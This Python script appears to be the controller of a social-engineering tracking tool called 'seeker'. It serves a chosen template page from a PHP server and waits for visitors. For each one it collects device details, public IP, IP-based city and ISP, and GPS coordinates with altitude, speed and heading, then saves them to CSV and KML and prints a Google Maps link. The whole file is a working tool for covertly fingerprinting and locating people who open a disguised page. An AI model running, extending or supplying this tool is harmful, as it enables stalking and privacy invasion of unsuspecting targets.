#!/usr/bin/env python3

VERSION = '1.2.8'

R = '\033[31m'  # red
G = '\033[32m'  # green
C = '\033[36m'  # cyan
W = '\033[0m'   # white
Y = '\033[33m'  # yellow

import sys
import argparse
import requests
import traceback
from os import path, kill, mkdir
from json import loads, decoder
from packaging import version

parser = argparse.ArgumentParser()
parser.add_argument('-k', '--kml', help='KML filename')
parser.add_argument('-p', '--port', type=int, default=8080, help='Web server port [ Default : 8080 ]')
parser.add_argument('-u', '--update', action='store_true', help='Check for updates')
parser.add_argument('-v', '--version', action='store_true', help='Prints version')

args = parser.parse_args()
kml_fname = args.kml
port = args.port
chk_upd = args.update
print_v = args.version

path_to_script = path.dirname(path.realpath(__file__))

SITE = ''
SERVER_PROC = ''
LOG_DIR = f'{path_to_script}/logs'
DB_DIR = f'{path_to_script}/db'
LOG_FILE = f'{LOG_DIR}/php.log'
DATA_FILE = f'{DB_DIR}/results.csv'
INFO = f'{LOG_DIR}/info.txt'
RESULT = f'{LOG_DIR}/result.txt'
TEMPLATES_JSON = f'{path_to_script}/template/templates.json'
TEMP_KML = f'{path_to_script}/template/sample.kml'
META_FILE = f'{path_to_script}/metadata.json'
META_URL = 'https://raw.githubusercontent.com/thewhiteh4t/seeker/master/metadata.json'

if not path.isdir(LOG_DIR):
	mkdir(LOG_DIR)

if not path.isdir(DB_DIR):
	mkdir(DB_DIR)

def chk_update():
	try:
		print('> Fetching Metadata...', end='', flush=True)
		rqst = requests.get(META_URL, timeout=5)
		meta_sc = rqst.status_code
		if meta_sc == 200:
			print('OK')
			metadata = rqst.text
			json_data = loads(metadata)
			gh_version = json_data['version']
			if version.parse(gh_version) > version.parse(VERSION):
				print(f'> New Update Available : {gh_version}')
			else:
				print('> Already up to date.')
	except Exception as exc:
		print(f'Exception : {str(exc)}')


if chk_upd is True:
	chk_update()
	sys.exit()

if print_v is True:
	print(VERSION)
	sys.exit()

import importlib
from csv import writer
from time import sleep
import subprocess as subp
from ipaddress import ip_address
from signal import SIGTERM


def banner():
	with open(META_FILE, 'r') as metadata:
		json_data = loads(metadata.read())
		twitter_url = json_data['twitter']
		comms_url = json_data['comms']

	art = r'''
                        __
  ______  ____   ____  |  | __  ____ _______
 /  ___/_/ __ \_/ __ \ |  |/ /_/ __ \\_  __ \
 \___ \ \  ___/\  ___/ |    < \  ___/ |  | \/
/____  > \___  >\___  >|__|_ \ \___  >|__|
     \/      \/     \/      \/     \/'''
	print(f'{G}{art}{W}\n')
	print(f'{G}[>] {C}Created By   : {W}thewhiteh4t')
	print(f'{G} |---> {C}Twitter   : {W}{twitter_url}')
	print(f'{G} |---> {C}Community : {W}{comms_url}')
	print(f'{G}[>] {C}Version      : {W}{VERSION}\n')


def template_select(site):
	print(f'{Y}[!] Select a Template :{W}\n')

	with open(TEMPLATES_JSON, 'r') as templ:
		templ_info = templ.read()

	templ_json = loads(templ_info)

	for item in templ_json['templates']:
		name = item['name']
		print(f'{G}[{templ_json["templates"].index(item)}] {C}{name}{W}')

	try:
		selected = int(input(f'{G}[>] {W}'))
		if selected < 0:
			print()
			print(f'{R}[-] {C}Invalid Input!{W}')
			sys.exit()
	except ValueError:
		print()
		print(f'{R}[-] {C}Invalid Input!{W}')
		sys.exit()

	try:
		site = templ_json['templates'][selected]['dir_name']
	except IndexError:
		print()
		print(f'{R}[-] {C}Invalid Input!{W}')
		sys.exit()

	print()
	print(f'{G}[+] {C}Loading {Y}{templ_json["templates"][selected]["name"]} {C}Template...{W}')

	module = templ_json['templates'][selected]['module']
	if module is True:
		imp_file = templ_json['templates'][selected]['import_file']
		importlib.import_module(f'template.{imp_file}')
	else:
		pass
	return site


def server():
	print()
	preoc = False
	print(f'{G}[+] {C}Port : {W}{port}\n')
	print(f'{G}[+] {C}Starting PHP Server...{W}', end='', flush=True)
	cmd = ['php', '-S', f'0.0.0.0:{port}', '-t', f'template/{SITE}/']

	with open(LOG_FILE, 'w+') as phplog:
		proc = subp.Popen(cmd, stdout=phplog, stderr=phplog)
		sleep(3)
		phplog.seek(0)
		if 'Address already in use' in phplog.readline():
			preoc = True
		try:
			php_rqst = requests.get(f'http://127.0.0.1:{port}/index.html')
			php_sc = php_rqst.status_code
			if php_sc == 200:
				if preoc:
					print(f'{C}[ {G}✔{C} ]{W}')
					print(f'{Y}[!] Server is already running!{W}')
					print()
				else:
					print(f'{C}[ {G}✔{C} ]{W}')
					print()
			else:
				print(f'{C}[ {R}Status : {php_sc}{C} ]{W}')
				cl_quit(proc)
		except requests.ConnectionError:
			print(f'{C}[ {R}✘{C} ]{W}')
			cl_quit(proc)
	return proc


def wait():
	printed = False
	while True:
		sleep(2)
		size = path.getsize(RESULT)
		if size == 0 and printed is False:
			print(f'{G}[+] {C}Waiting for Client...{Y}[ctrl+c to exit]{W}\n')
			printed = True
		if size > 0:
			data_parser()
			printed = False


def data_parser():
	data_row = []
	with open(INFO, 'r') as info_file:
		info_file = info_file.read()
	try:
		info_json = loads(info_file)
	except decoder.JSONDecodeError:
		print(f'{R}[-] {C}Exception : {R}{traceback.format_exc()}{W}')
	else:
		var_os = info_json['os']
		var_platform = info_json['platform']
		var_cores = info_json['cores']
		var_ram = info_json['ram']
		var_vendor = info_json['vendor']
		var_render = info_json['render']
		var_res = info_json['wd'] + 'x' + info_json['ht']
		var_browser = info_json['browser']
		var_ip = info_json['ip']

		data_row.extend([var_os, var_platform, var_cores, var_ram, var_vendor, var_render, var_res, var_browser, var_ip])

		print(f'''{Y}[!] Device Information :{W}

{G}[+] {C}OS         : {W}{var_os}
{G}[+] {C}Platform   : {W}{var_platform}
{G}[+] {C}CPU Cores  : {W}{var_cores}
{G}[+] {C}RAM        : {W}{var_ram}
{G}[+] {C}GPU Vendor : {W}{var_vendor}
{G}[+] {C}GPU        : {W}{var_render}
{G}[+] {C}Resolution : {W}{var_res}
{G}[+] {C}Browser    : {W}{var_browser}
{G}[+] {C}Public IP  : {W}{var_ip}
''')

		if ip_address(var_ip).is_private:
			print(f'{Y}[!] Skipping IP recon because IP address is private{W}')
		else:
			rqst = requests.get(f'https://ipwhois.app/json/{var_ip}')
			s_code = rqst.status_code

			if s_code == 200:
				data = rqst.text
				data = loads(data)
				var_continent = str(data['continent'])
				var_country = str(data['country'])
				var_region = str(data['region'])
				var_city = str(data['city'])
				var_org = str(data['org'])
				var_isp = str(data['isp'])

				data_row.extend([var_continent, var_country, var_region, var_city, var_org, var_isp])

				print(f'''{Y}[!] IP Information :{W}

{G}[+] {C}Continent : {W}{var_continent}
{G}[+] {C}Country   : {W}{var_country}
{G}[+] {C}Region    : {W}{var_region}
{G}[+] {C}City      : {W}{var_city}
{G}[+] {C}Org       : {W}{var_org}
{G}[+] {C}ISP       : {W}{var_isp}
''')

	with open(RESULT, 'r') as result_file:
		results = result_file.read()
		try:
			result_json = loads(results)
		except decoder.JSONDecodeError:
			print(f'{R}[-] {C}Exception : {R}{traceback.format_exc()}{W}')
		else:
			status = result_json['status']
			if status == 'success':
				var_lat = result_json['lat']
				var_lon = result_json['lon']
				var_acc = result_json['acc']
				var_alt = result_json['alt']
				var_dir = result_json['dir']
				var_spd = result_json['spd']

				data_row.extend([var_lat, var_lon, var_acc, var_alt, var_dir, var_spd])

				print(f'''{Y}[!] Location Information :{W}

{G}[+] {C}Latitude  : {W}{var_lat}
{G}[+] {C}Longitude : {W}{var_lon}
{G}[+] {C}Accuracy  : {W}{var_acc}
{G}[+] {C}Altitude  : {W}{var_alt}
{G}[+] {C}Direction : {W}{var_dir}
{G}[+] {C}Speed     : {W}{var_spd}
''')

				print(f'{G}[+] {C}Google Maps : {W}https://www.google.com/maps/place/{var_lat.strip(" deg")}+{var_lon.strip(" deg")}')

				if kml_fname is not None:
					kmlout(var_lat, var_lon)
			else:
				var_err = result_json['error']
				print(f'{R}[-] {C}{var_err}\n')

	csvout(data_row)
	clear()
	return


def kmlout(var_lat, var_lon):
	with open(TEMP_KML, 'r') as kml_sample:
		kml_sample_data = kml_sample.read()

	kml_sample_data = kml_sample_data.replace('LONGITUDE', var_lon.strip(' deg'))
	kml_sample_data = kml_sample_data.replace('LATITUDE', var_lat.strip(' deg'))

	with open(f'{path_to_script}/{kml_fname}.kml', 'w') as kml_gen:
		kml_gen.write(kml_sample_data)

	print(f'{Y}[!] KML File Generated!{W}')
	print(f'{G}[+] {C}Path : {W}{path_to_script}/{kml_fname}.kml')


def csvout(row):
	with open(DATA_FILE, 'a') as csvfile:
		csvwriter = writer(csvfile)
		csvwriter.writerow(row)
	print(f'{G}[+] {C}Data Saved : {W}{path_to_script}/db/results.csv\n')


def clear():
	with open(RESULT, 'w+'):
		pass
	with open(INFO, 'w+'):
		pass


def repeat():
	clear()
	wait()


def cl_quit(proc):
	clear()
	if proc:
		kill(proc.pid, SIGTERM)
	sys.exit()


try:
	banner()
	clear()
	SITE = template_select(SITE)
	SERVER_PROC = server()
	wait()
	data_parser()
except KeyboardInterrupt:
	print(f'{R}[-] {C}Keyboard Interrupt.{W}')
	cl_quit(SERVER_PROC)
else:
	repeat()
